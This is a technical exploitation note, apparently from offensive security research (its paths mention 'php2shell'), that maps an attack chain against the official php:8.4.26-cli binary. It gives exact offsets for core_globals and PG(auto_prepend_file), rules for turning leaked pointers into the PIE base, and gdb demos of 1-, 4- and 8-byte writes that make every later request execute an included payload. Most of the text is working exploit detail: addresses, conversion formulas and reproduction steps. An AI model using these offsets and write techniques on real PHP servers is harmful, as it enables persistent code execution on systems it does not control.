# MAPPING.md — PG(auto_prepend_file) write-chain mapping
## php:8.4.26-cli (official Docker image) — leak → anchor → PG write → per-request auto-include

**Target artifact:** `php:8.4.26-cli`, RepoDigest `sha256:e2432ac85c3454004d89e3d75615abd2d205b7ffb9590e586fad1a053f016bb3` (verified by `docker inspect`, matches pinned prefix `e2432ac85c34`).
Extracted binary: `/home/wh1t3r0se/ph2s_pgwrite/image/php-8.4.26-bin` (copied out of the image via `docker run -v ... cp /usr/local/bin/php`, byte-for-byte the shipped `/usr/local/bin/php`; PHP 8.4.26 CLI, NTS, built Oct 21 2026 by docker-library/php).

Everything below was extracted from CLI tools on that exact binary (`readelf`, `nm`, `objdump`, gdb 18.1) and live-verified against that binary running natively (see §4). Source cross-reference: unpatched tree `/home/wh1t3r0se/php-8.4.4`; upstream `main/php_globals.h` is **byte-identical between php-8.4.4 and php-8.4.26** (`diff` of raw.githubusercontent tags), so offsets computed on sources apply 1:1 to the shipped binary.

---

## 1. Symbol / field offsets — official binary

### 1.1 Binary facts

```
Type: DYN (PIE), x86-64, entry 0x256740, interpreter /lib64/ld-linux-x86-64.so.2
stripped (.symtab absent), but PHPAPI/ZEND_API objects+funcs exported via .dynsym
.text     vaddr 0x204740  size 0x50fca6      (exec)
.rodata   vaddr 0x800000  size 0xa42e38
.data.rel.ro 0x15232c0  (GNU_RELRO 0x15232a8..0x15ffff6 → GOT/relro covered)
.got      0x15ffb80   .got.plt 0x15fffe8    .data 0x1602360
.bss      vaddr 0x16c5f80  size 0x22510      (writable, NOT relro)
```

### 1.2 Exported .bss anchor objects (dynsym, verified with `readelf --dyn-syms -W`)

| symbol                | vaddr        | size | note |
|-----------------------|-------------|------|------|
| `core_globals`        | **0x16e12e0** | 616 = 0x268 | php_core_globals; `PG(v) = core_globals.v` (NTS build) |
| `executor_globals`    | 0x16e2020   | 1960 | `EG()` |
| `compiler_globals`    | 0x16e27e0   | 616  | `CG()` |
| `sapi_globals`        | 0x16e1880   | 648  | `SG()` |
| `basic_globals`       | 0x16cc3a0   | 1360 | `BG()` (ext/standard) |
| `zend_signal_globals` | 0x16e43e0   | 3136 | |
| `zend_one_char_string`| 0x16e54e0   | 2048 | |
| `zend_write` / `zend_fopen` | 0x16e80b8 / 0x16e80b0 | 8/8 | BSS function pointers |
| `sapi_module`         | 0x16e1760   | 280  | |
| `php_rfc1867_callback`| 0x16e1748   | 8    | BSS fn pointer (relevant: see §3) |

**Where PG is anchored in 8.4:** there is no `_zend_globals` aggregate in this build; `PG(v)` is `core_globals.v` directly (see `main/php_globals.h`, `#else` non-ZTS branch). The engine globals are individually exported BSS objects. asm proof below and runtime proof in §4.

### 1.3 Field offsets inside `struct _php_core_globals` (total size 616)

Extracted three ways, results identical:
1. **Disassembly of the official stripped binary** (`php_execute_script_ex` @ `.text+0x5a0a70`) — the compiler emits `lea core_globals(%rip),%rax` + fixed near-registers offsets:
   - `mov 0xa0(%rax),%rsi; cmpb $0x0,(%rsi)` → `PG(auto_prepend_file)` (source line `main.c:2557` in 8.4.26)
   - `mov 0xa8(%rax),%rsi; cmpb $0x0,(%rsi)` → `PG(auto_append_file)`
   - `cmpq $-1,0x30(%rax)` → `PG(max_input_time)` @ 0x30
   - `movb $0x0,0x1e2(%rax)` → `PG(during_request_startup)=0` @ 0x1e2
2. **DWARF** of the local unpatched debug build (`gdb ptype /o struct _php_core_globals`, `/home/wh1t3r0se/ph2s_pgwrite/notes/dwarf_php_core_globals.txt`) — matches the disassembly row-for-row including struct size 616.
3. **Hand layout** of `main/php_globals.h` — matches both.

Key fields (offset, type):

| offset | field |
|--------|-------|
| 0x30 | zend_long max_input_time |
| 0x38 | char *error_log |
| 0x40 | char *doc_root |
| 0x50 | char *include_path |
| 0x58 | char *open_basedir |
| 0x80 | char *upload_tmp_dir |
| 0x90 | char *error_append_string |
| 0x98 | char *error_prepend_string |
| **0xa0** | **char *auto_prepend_file** |
| **0xa8** | **char *auto_append_file** |
| 0xb0..0xc0 | char *input/internal/output_encoding |
| 0xd8 | char *variables_order |
| 0xe0 | HashTable rfc1867_protected_variables (56 B, inline) |
| 0x158 | zval http_globals[6] (96 B) |
| 0x1e2 | bool during_request_startup |
| 0x245 | bool allow_url_include |

### 1.4 Runtime address computation (PIE, one slide for the whole image)

The binary has a single relocation constant (`pie_base`, page/2MB-aligned):

```
pie_base (runtime) = load address of the binary (first mapping in /proc/<pid>/maps)

PG(auto_prepend_file) runtime = pie_base + 0x16e12e0 + 0xa0
                              = pie_base + 0x16e1380
PG(auto_append_file) runtime  = pie_base + 0x16e1388
executor_globals runtime      = pie_base + 0x16e2020
basic_globals runtime         = pie_base + 0x16cc3a0
```

`pie_base` from **any single leaked pointer** whose class is known:

| leaked pointer class | conversion |
|---|---|
| .text code ptr (e.g. return addr into `php_execute_script_ex`) | `base = leak − <the function's vaddr in this binary>` |
| .bss global addr (any anchor above) | `base = leak − <symbol vaddr>` |
| .rodata constant addr | `base = leak − <string/const vaddr>` |
| heap (Zend MM) pointer | NOT deterministic per build+run sequence — don't use to recompute base; use struct-relative math only |

Worked live example (Demo C, run 3): observed `pie_base = 0x7986eb800000` ⇒ computed `PG(apf) = 0x7986ecee1380`. gdb read at exactly that address returned `0x0` (NULL, apf unset), was written, and the next HTTP requests served by the same process executed the prepend payload (§5).

Fingerprint check: low bits of the PG field address are constant across runs — `0x16e1380 & 0xfff = 0x380`. A candidate PG(apf) address not ending `…380` under 4K alignment is immediately suspect.

---

## 2. Page-integrity decision support — which leaked pointer classes are the most stable anchors

Ranked by determinism of virtual offset **for this exact build** (every per-build vaddr is fixed; only the 2 MB-aligned slide `pie_base` varies per process launch):

1. **.text function-entry pointers** — the strongest anchor. Fully slide-locked, one conversion to `pie_base`. Leaked naturally via stack-return contents, internal-function entries cached in executor structures, etc.
2. **.bss engine-global objects** (`core_globals`+family: executor/compiler/sapi/basic/zend_signal globals, `zend_one_char_string`) — slide-locked, and all co-resident within ~85 KB of .bss: any one of them resolves all of them, *and* `core_globals` is the write target itself. Best-case leak class for this chain element.
3. **.rodata constants** — slide-locked; useful when a leak yields a pointer to a known constant (string literals, static handler tables).
4. **.data.rel.ro / GOT** — GOT entries resolve to *library* bases (libc, not the PHP image); still slide-locked per module and useful for computing libc/ld addresses, but not php's `pie_base` from GOT contents alone.
5. **Heap pointers (Zend MM arena, VM stacks, zvals)** — allocation-sequence dependent; not stable across runs or requests; use only for struct-relative arithmetic, never for base recovery.

Answers to the specific candidates asked about:

- **`zend_globals.?`** — does not exist as an aggregate symbol in 8.4.26-cli (verified: no `zend_globals` object exported; `grep` of `Zend/zend_globals.h` shows the engine globals are separately declared and exported: `executor_globals`, `compiler_globals`, `zend_signal_globals`). Treat them as individual .bss anchors (#2).
- **`rfc1867_progress`** — **no such symbol in this build** (grep of sources and dynsym is empty). What does exist for rfc1867 in 8.4:
  - `PG(rfc1867_protected_variables)` — a 56-byte `HashTable` **inline inside core_globals @ +0xe0**, i.e. on the same page as the target fields; any pointer leak into this struct pins the core_globals page directly.
  - `php_rfc1867_callback` — an 8-byte BSS function pointer @ `0x16e1748` (0x468 above core_globals, same BSS region). Its *value* is NULL in CLI (unreliable as content), but the *address of any pointer holding/used near it* resolves the base like any other .bss anchor.
- **`basic_globals`** — solid .bss anchor @ `0x16cc3a0` (1360 B), 0x14f40 bytes *below* core_globals: a leaked pointer with value in `[base+0x16cc3a0, base+0x16cc8f0)` identifies the slide exactly, hence PG's page.

**Decision rule:** prefer (1) .text then (2) .bss-global anchors → compute `pie_base` → PG(apf) = `pie_base+0x16e1380` → perform the write (8-byte pointer swap; 1–4-byte variants also shown viable in §5 when the leak supplies the upper pointer bits as-is).

**Consumption point / persistence semantics:** `PG(auto_prepend_file)` is read once per *request* in `php_execute_script_ex` (main.c:2557). In the CLI built-in server (`php -S`) that is once per HTTP request inside one long-lived process; in an FPM worker it is once per HTTP request in the worker process (lifetime = many requests). A single in-process write therefore produces the "every subsequent request auto-includes" effect claimed in the chain. Verified live in §5.

Oracle caveat (observed): `ini_get('auto_prepend_file')` reports the *ini-entry stored value*, **not** the live PG pointer — after Demo B's 4-byte pointer swap the request executed the payload while `ini_get` still printed the decoy path. Use request behavior as the oracle, not `ini_get`.

---

## 3. rfc1867 note (connector to vendor-fix context)

`main/rfc1867.c` in 8.4 keeps no per-request progress global pointer reachable from userland-visible structures; its state hooks are `PG(rfc1867_protected_variables)` (inline HashTable, core_globals+0xe0) and `php_rfc1867_callback` (BSS+0x16e1748). Vendor fix diff at `/mnt/e/Code Projects/REA/php2shell/evidence/security-fix-506e87fa7.diff` is outside scope of this mapping but does not alter the offsets above (offset extraction is from the shipped binary's own dynsym + disassembly, not from source assumptions).

---

## 4. Extraction evidence and live verification of §1

- dynsym tables / section headers: `readelf -h -l -S --dyn-syms /home/wh1t3r0se/ph2s_pgwrite/image/php-8.4.26-bin`
- disassembly excerpt of `php_execute_script_ex` showing `0xa0/0xa8/0x30/0x1e2` accesses off `core_globals`: `objdump -d --start-address=0x5a0a70 --stop-address=0x5a0f00 …` (artifact `/tmp/pes.dis` regenerated on demand)
- DWARF cross-check: `/home/wh1t3r0se/ph2s_pgwrite/notes/dwarf_php_core_globals.txt` (gdb `ptype /o` on local unpatched debug build)
- header identity 8.4.4 ↔ 8.4.26: `diff` against upstream tag files (identical for `main/php_globals.h`; consumer line `main.c` only shifted 2555→2557)

Runtime re-verification on the official binary itself (not the debug build), Demo C of `demo/run_demo.sh`:
- ran the image's php natively using the image's own loader/libs: `image/sysroot/ld-linux-x86-64.so.2.real --library-path image/sysroot/x86_64-linux-gnu image/php-8.4.26-bin -n -S 127.0.0.1:18993 -t demo/docroot`
- read `pie_base` from `/proc/<pid>/maps`
- computed `PG(apf) = pie_base + 0x16e1380`, gdb `x/gx` at the computed address → `0x0` (NULL)
- anchor self-tests in the same gdb session:
  - `x/s pie_base+0x824fab` → `"max_execution_time"` (.rodata anchor correct)
  - `x/3i pie_base+0x5a0a70` → `push %rbp; mov %rsp,%rbp; push %r12` (prologue of `php_execute_script_ex` matches objdump)
- then the write (§5 Demo C).

## 5. Smallest demonstrable in-process write (executed end-to-end, reproducible)

Automated: `/home/wh1t3r0se/ph2s_pgwrite/demo/run_demo.sh` → logs `demo/demo_full.log` (run 2) and `demo/demo_full_run3.log` (run 3, different ASLR base, verified-from-scratch rerun). Payload file: `/tmp/proof_includes.txt` (`<?php echo "\nPGWRITE_PROOF_MARKER\n";`). Each demo runs baseline curl BEFORE the write (clean), attaches gdb to the live server, writes, detaches, then issues SUBSEQUENT HTTP requests to the SAME process; prepend marker appears in every subsequent response.

- **DEMO A — 1 byte** (debug build, gdb attach): process started with `-d auto_prepend_file=/tmp/proof_includeq.txt` (decoy, silent). gdb wrote a single byte `0x71('q')→0x73('s')` at `PG(apf)+18` of the pointed path string: live value flipped to `/tmp/proof_includes.txt` (see `demo/a_gdb.log`). Subsequent requests executed the payload; effect persisted on request #3 in the same process.
- **DEMO B — 4 bytes** (debug build): low-half pointer overwrite of the PG field **itself**: gdb `strdup`'d the proof path in the inferior (0x5a11d70db2e0, same high 32 bits as the existing decoy pointer 0x5a11d6fbca88, `high32eq=1`), then wrote only the low 4 bytes of `&PG(apf)`. Subsequent request executed the payload (`demo/b_gdb.log`). Models the leak-supplied-upper-bits partial-overwrite case.
- **DEMO C — 8 bytes** (the exact docker `php:8.4.26-cli` binary, stripped, no symtab; offsets taken purely from §1): computed `PG(apf) = pie_base + 0x16e1380`, gdb read old value `0x0`, wrote an 8-byte pointer to a `strdup`ed `/tmp/proof_includes.txt`; subsequent requests printed `PGWRITE_PROOF_MARKER`, twice verified (runs 2 and 3, bases `0x720c9be00000` / `0x7986eb800000`).

Environment requirement for reproduction (host quirk, not php state): yama `kernel.yama.ptrace_scope=1` blocks `gdb -p` onto sibling processes; the script snapshots the value, sets 0 via sudo for its duration and always restores it (trap; verified `cat` = 1 after each run). The official binary needs the image's own loader/lib set (`image/sysroot/`); this is a runtime staging detail, not a patch to php.

Result bounds:
- minimal delta demonstrated: **1 byte** (string content) / **4 bytes** (pointer low half) / 8 bytes (NULL→pointer on the official binary).
- write confirmed in-process with subsequent-request auto-inclusion: **yes, three times**, including twice on the exact official image binary.

---

## 6. Summary block

```
extracted_pg_offset_from_runtime=0x16e1380  (vaddr; = core_globals @0x16e12e0 + offsetof(auto_prepend_file)=0xa0; runtime absolute = pie_base + 0x16e1380)
write_confirmed_in_process=true
note file: /home/wh1t3r0se/ph2s_pgwrite/MAPPING.md
```

Artifacts: `image/php-8.4.26-bin` (official binary), `image/sysroot/` (runtime), `notes/dwarf_php_core_globals.txt` (DWARF appendix), `demo/run_demo.sh` (+ `demo/demo_full.log`, `demo/demo_full_run3.log`, `demo/{a,b}_gdb.log`, `demo/c_gdb.log`, payload/decoy files, docroot).
